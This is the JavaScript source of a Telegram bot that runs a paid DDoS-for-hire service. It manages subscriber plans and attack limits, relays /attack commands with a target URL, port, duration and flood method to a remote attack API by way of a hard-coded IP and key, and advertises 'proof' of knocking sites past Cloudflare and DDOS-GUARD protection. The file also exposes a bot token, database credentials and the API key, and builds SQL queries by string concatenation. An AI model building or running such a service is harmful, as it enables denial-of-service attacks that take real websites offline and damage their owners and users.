var TelegramBot = require('node-telegram-bot-api');
var requestModule = require('request');
var jar = requestModule.jar();
var request = requestModule.defaults({jar: jar});
const mysql = require("mysql");
var scalc = require('scalc');

var token = '1269789954:AAE_MEJmdnyv6cxqbHEv-y6Ydt_g3yY9dI4';
var help = `
How to use the bot:

~ Tariff plans — /plans
~ View methods — /method
~ Launch attack — /attack
`;  
var bot = new TelegramBot(token, { polling: true });

const connection = mysql.createConnection({
    host: "localhost",
    user: "phpmyadmin",
    database: "telegram",
    password: "temkakek"
  });
    connection.connect(function(err){
        if (err) {
            return console.error("[INFO] Error: " + err.message);
        }
        else{
            console.log("[INFO] The connection to the MySQL server was successfully established");
        }
});

function account(tg_id) {
    connection.query("SELECT * FROM user WHERE tg_id = " + tg_id + "", function (err, result, fields) {

            const user = [tg_id];
            const sql = "INSERT INTO user(id, tg_id, plan, time, status) VALUES(NULL, ?, 'Unknown', '0', 'no')";
            if(result[0] == null) {
                connection.query(sql, user, function(err, results) {
                    if(err) {
                        console.log("[INFO]" + err);
                    } else { 
                        console.log("[INFO] Account " + tg_id + " successfully created");
                    }
                });
            } else {
                var time = Math.floor(new Date() / 1000);
                if(result[0].expire < time) {
                    var time = '0';
                    var plan = 'Unknown';
                    var status = 'no';
                    var attack_limit = '0';
                    
                    const user1 = [time,result[0].tg_id];
                    const user2 = [plan,result[0].tg_id];
                    const user3 = [status,result[0].tg_id];
                    const user4 = [attack_limit,result[0].tg_id];
                    
                    const sql1 = "UPDATE user SET time=? WHERE tg_id=?";
                    const sql2 = "UPDATE user SET plan=? WHERE tg_id=?";
                    const sql3 = "UPDATE user SET status=? WHERE tg_id=?";
                    const sql4 = "UPDATE user SET attack_limit=? WHERE tg_id=?";
    
                    connection.query(sql1, user1, function(err, results) {});
                    connection.query(sql2, user2, function(err, results) {});
                    connection.query(sql3, user3, function(err, results) {});
                    connection.query(sql4, user4, function(err, results) {});

                    bot.sendMessage(result[0].tg_id, 'Your subscription has ended');
                }
            }
    });
}
bot.on('message', (msg) => {
    var fromId = msg.from.id; 
    new account(fromId);

    console.log(msg);

    var msg_error = `
    Error, you didn't specify the URL

    ~ Example: /attack https://google.com/ 80 120 Engine
    `;
    if(msg.text == '/attack') {
        console.log("User " + fromId + " use command /attack");
        bot.sendMessage(fromId, msg_error);
    }
    if(msg.text == '/help') {
        console.log("User " + fromId + " use command /help");
        bot.sendMessage(fromId, help);
    }
    if(msg.text == '/start') {
        console.log("User " + fromId + " use command /start");
        bot.sendMessage(fromId, help);
    }
});
bot.onText(/\/attack (.+)/, function (msg, match) {
    var fromId = msg.from.id; 
    console.log("User " + fromId + " use command /attack");
    
    connection.query("SELECT * FROM user WHERE tg_id = " + fromId + "", function (err, result, fields) {
        connection.query("SELECT * FROM attack WHERE tg_id = " + fromId + " AND time_end >= " + Math.floor(new Date() / 1000) + "", function (err1, result1, fields1) {
            var content = match[1];
            var text = content.split(" "); 

            var host = text[0];
            var port = text[1];
            var time = text[2];
            var method = text[3];
            
            var msg_attack = `
            Attack has been started ❤

            ~ URL: ` + host + `
            ~ PORT: ` + port + `
            ~ TIME: ` + time + `
            ~ METHOD: ` + method + `
            `;

            var msg_error0 = `
            Error, you don't have a subscription.

            ~ View plans and buy: /plans
            `;

            var msg_error1 = `
            Error, you didn't specify the URL

            ~ Example: /attack https://google.com/ 80 120 Engine
            `;

            var msg_error2 = `
            Error, you didn't specify PORT

            ~ Example: /attack https://google.com/ 80 120 Engine
            `;

            var msg_error3 = `
            Error, you didn't specify the time

            ~ Example: .attack https://google.com/ 80 120 Engine
            `;

            var msg_error4 = `
            Error, you didn't specify the method

            ~ Example: .attack https://google.com/ 80 120 Engine
            `;

            var msg_error5 = `
            Error: you specified too long attack time

            ~ Your maximum attack time: ` + result[0].time + ` seconds`;

            var msg_error6 = `
            Mistake. 
            
            You have a limit of attacks, to launch more attacks wait for the attacks to end or buy a better plan
            `;

            if(result[0].status != 'yes') {
                bot.sendMessage(fromId, msg_error0);
                var attack = '0';
            } else if(host == null) {
                bot.sendMessage(fromId, msg_error1);
                var attack = '0';
            } else if(port == null) {
                bot.sendMessage(fromId, msg_error2);
                var attack = '0';
            } else if(time == null) {
                bot.sendMessage(fromId, msg_error3);
                var attack = '0';
            } else if(method == null) {
                bot.sendMessage(fromId, msg_error4);
                var attack = '0';
            } else if(time > result[0].time) {
                bot.sendMessage(fromId, msg_error5);
                var attack = '0';
            } else if(result1.length == result[0].attack_limit) {
                bot.sendMessage(fromId, msg_error6);
                var attack = '0';
            }

            if(attack != '0') {
                request.get(
                    {
                        url: 'http://88.99.216.131/api.php?key=XNb2tDwvlUon55KwnR7MkcN3MBrqSrbvhhSfOQ3xZHtwLBeSGQGJFyNR5tP8b7u38dU48eosvsa9PnjbMAqWvhWP7DAb0OtbVDk&host=' + host + '&port=' + port + '&time=' + time + '&method=' + method +''
                    }
                );
                var time_start = Math.floor(new Date() / 1000);
                var time_end = Number(time_start)+Number(time);
                const user = [fromId,time_start,time_end];
                const sql = "INSERT INTO attack(id, tg_id, time_start, time_end) VALUES(NULL, ?, ?, ?)";
                connection.query(sql, user, function(err, results) {
                    if(err) {
                        console.log("[INFO]" + err);
                    }
                });
                bot.sendMessage(fromId, msg_attack);
        }
        });
    });
});

bot.onText(/\/stopall/, function (msg, match) {
    var fromId = msg.from.id; 
    console.log("User " + fromId + " use command /stopall"); 

    connection.query("SELECT * FROM user WHERE tg_id = " + fromId + "", function (err, result, fields) {

        if(result[0].plan == 'Owner') {
            var msg_stop = `
            All attacks on the server are stopped

            ~ Launch an attack — /attack
            `;
            request.get(
                {
                    url: 'http://88.99.216.131/api.php?key=XNb2tDwvlUon55KwnR7MkcN3MBrqSrbvhhSfOQ3xZHtwLBeSGQGJFyNR5tP8b7u38dU48eosvsa9PnjbMAqWvhWP7DAb0OtbVDk&host=https://google.com/&port=80&time=120&method=stopall'
                }
            );
            connection.query("TRUNCATE TABLE attack;", function (err, result, fields) {
                if(err) {
                    console.log("[INFO]" + err);
                }
            });   
            bot.sendMessage(fromId, msg_stop);    
        }

    });
});

bot.onText(/\/addplan (.+)/, function (msg, match) {
    var fromId = msg.from.id; 
    console.log("User " + fromId + " use command /addplan"); 
    var content = match[1]; 
    var text = content.split(" "); 

    
    connection.query("SELECT * FROM user WHERE tg_id = " + fromId + "", function (err, result, fields) {

        var id = text[0]; 
        var time = text[1];
        var plan = text[2]; 
        var attack_limit = text[3]; 
        var days = text[4]; 
        if(plan == 'Unknown') {
            var status = 'no'
        } else {
            var status = 'yes'
        }

        if(result[0].plan == 'Owner') {
            
                var timef = Math.floor(new Date() / 1000);
                var days_time = Number(86400)*Number(days);
                var time_plan = Number(timef)+Number(days_time);

                const user1 = [time,id];
                const user2 = [plan,id];
                const user3 = [status,id];
                const user4 = [attack_limit,id];
                const user5 = [time_plan,id];
                
                const sql1 = "UPDATE user SET time=? WHERE tg_id=?";
                const sql2 = "UPDATE user SET plan=? WHERE tg_id=?";
                const sql3 = "UPDATE user SET status=? WHERE tg_id=?";
                const sql4 = "UPDATE user SET attack_limit=? WHERE tg_id=?";
                const sql5 = "UPDATE user SET expire=? WHERE tg_id=?";

                connection.query(sql1, user1, function(err, results) {
                    console.log("[INFO] Add to user " + fromId + " time " + time);
                });

                connection.query(sql2, user2, function(err, results) {
                    console.log("[INFO] Add to user " + fromId + " plan " + plan);
                });

                connection.query(sql3, user3, function(err, results) {
                    console.log("[INFO] Set user " + fromId + " status to " + status);
                });
                connection.query(sql4, user4, function(err, results) {
                    console.log("[INFO] Set user " + fromId + " attack limit to " + status);
                });
                connection.query(sql5, user5, function(err, results) {
                    console.log("[INFO] Set user " + fromId + " time to " + time_plan);
                });

                bot.sendMessage(fromId, `
                Successfully issued a plan:

                ~ ID: ` + id + `
                ~ TIME: ` + time + `
                ~ PLAN: ` + plan + `
                ~ LIMIT: ` + attack_limit + `
                ~ DAYS: ` + days + `
                `);  
                
                bot.sendMessage(id, `The administrator gave you an ` + plan + ` plan for ` + days + ` days`); 
        }

    });
});

bot.onText(/\/plans/, function (msg, match) {
    var fromId = msg.from.id; 
    console.log("User " + fromId + " use command /plans");
    

    var plans = `
    Pricing plans:

    PLAN1:
    ~ 300 seconds
    ~ 1 $.
    
    PLAN2:
    ~ 600 seconds
    ~ 5 $.
    
    PLAN3:
    ~ 1200 seconds
    ~ 10 $.
    
    PLAN4:
    ~ 2400 seconds
    ~ 13 $.
    
    PLAN5:
    ~ 4200 seconds
    ~ 15 $.
    
    PLAN6:
    ~ 5200 seconds
    ~ 25 $.
    
    PLAN7:
    ~ 8600 seconds
    ~ 27 $.
    
    PLAN8:
    ~ 12600 seconds
    ~ 35 $.
    
    PLAN9:
    ~ 26000 seconds
    ~ 40 $.
    
    
    ~ For purchase — @GARFIELDOFC
    `;

    bot.sendMessage(fromId, plans);
});

bot.onText(/\/method/, function (msg, match) {
    var fromId = msg.from.id; 
    console.log("User " + fromId + " use command /method");
    

    var method = `
    Available methods:

    ~ SmartPost
    ~ SmartGet
    ~ Engine
    ~ HTTP-PPS
    ~ XML-RPC
    
    ~ stop
    `;

    bot.sendMessage(fromId, method);
});

bot.onText(/\/proof/, function (msg, match) {
    var fromId = msg.from.id; 
    console.log("User " + fromId + " use command /proof");
    

    var proof = `
    Power proof:


    Dstat:
    ~ CLOUDFLARE UAM: https://imgur.com/a/tLqFTx0 [Engine]
    ~ DataCamp L7: https://imgur.com/a/qZ7WAaQ [HTTP-PPS]
    ~ Hetzner L7: https://imgur.com/a/RVUHJL6 [HTTP-PPS]
    ~ Voxility L7: https://imgur.com/a/eWemsuv [HTTP-PPS]
    
    WebSite:
    ~ DDOS-GUARD: https://imgur.com/a/JLcaert [Engine]
    ~ BEGET: https://imgur.com/a/V7PcBXM [XML-RPC]
    ~ WEBHOST1: https://imgur.com/a/dD8Im7m [XML-RPC]
    `;

    bot.sendMessage(fromId, proof);
});

bot.onText(/\/info/, function (msg, match) {
    var fromId = msg.from.id; 
    console.log("User " + fromId + " use command /info");
    
    connection.query("SELECT * FROM user WHERE tg_id = " + fromId + "", function (err, result, fields) {

        var info = `
        Information about you:

        ~ Your ID: ` + fromId + `
        ~ Tariff plan: ` + result[0].plan + `
        ~ The maximum attack time: ` + result[0].time + `  
        `;

        bot.sendMessage(fromId, info);
    });
});
